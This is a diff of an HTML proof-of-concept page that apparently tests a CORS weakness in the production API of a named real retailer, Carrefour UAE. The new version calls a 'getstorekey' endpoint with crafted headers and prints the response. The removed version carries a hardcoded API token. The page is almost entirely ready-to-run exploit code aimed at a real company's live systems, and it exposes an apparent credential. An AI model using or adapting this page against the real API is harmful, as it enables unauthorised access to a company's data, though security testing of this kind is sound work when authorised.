@@ -1,58 +1,40 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>CORS PoC - Carrefour API</title>
+  <meta charset="UTF-8">
+  <title>Carrefour UAE - Get Store Key PoC</title>
   <style>
-    body {
-      font-family: sans-serif;
-      padding: 20px;
-      background: #f4f4f4;
-    }
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      margin-bottom: 20px;
-      cursor: pointer;
-    }
-    pre {
-      background: white;
-      padding: 15px;
-      border: 1px solid #ccc;
-      max-height: 400px;
-      overflow: auto;
-    }
+    body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
+    button { padding: 10px 15px; font-size: 16px; cursor: pointer; }
+    pre { background: #fff; padding: 15px; border: 1px solid #ccc; white-space: pre-wrap; max-height: 500px; overflow: auto; }
   </style>
 </head>
 <body>
-  <h2>📦 Carrefour API CORS Test</h2>
-  <button onclick="fetchData()">Fetch API Data</button>
-  <pre id="output">Click the button to fetch data...</pre>
+  <h2>🚨 CORS PoC – Get Store Key</h2>
+  <button onclick="fetchStoreKey()">Fetch Store Key</button>
+  <pre id="output">Click the button above to fetch response from target API.</pre>
 
   <script>
-    function fetchData() {
-      document.getElementById("output").textContent = "Loading...";
+    function fetchStoreKey() {
+      document.getElementById("output").textContent = "⏳ Fetching...";
 
-      fetch("https://api-prod.retailsso.com/v1/frame/page-components?ids=56794", {
+      fetch("https://api-prod.retailsso.com/v1/instorecompanion/getstorekey?latitude=0&longitude=0", {
         method: "GET",
         headers: {
+          "Appid": "Web",
+          "Langcode": "en",
+          "Referer": "https://instore.carrefouruae.com",
           "Env": "prod",
-          "Appid": "Reactweb",
-          "Token": "43637022-547D-64D6-8CBE-88457DCDC69F",
-          "Lang": "en",
-          "Longitude": "55.3613635",
-          "Latitude": "25.2171003",
-          "Storeid": "mafuae",
-          "Posinfo": "express=003_Zone01,QELEC=003_Zone01,food=072_Zone01,nonfood=099_Zone01"
+          "Lang": "en",  // No injection
+          "Storeid": "mafuae"
         }
-        // Don't use `credentials: include` unless CORS allows it
       })
       .then(response => response.text())
       .then(data => {
         document.getElementById("output").textContent = data;
       })
-      .catch(err => {
-        document.getElementById("output").textContent = "❌ CORS Blocked or Error: " + err;
+      .catch(error => {
+        document.getElementById("output").textContent = "❌ Request failed:\n" + error;
       });
     }
   </script>
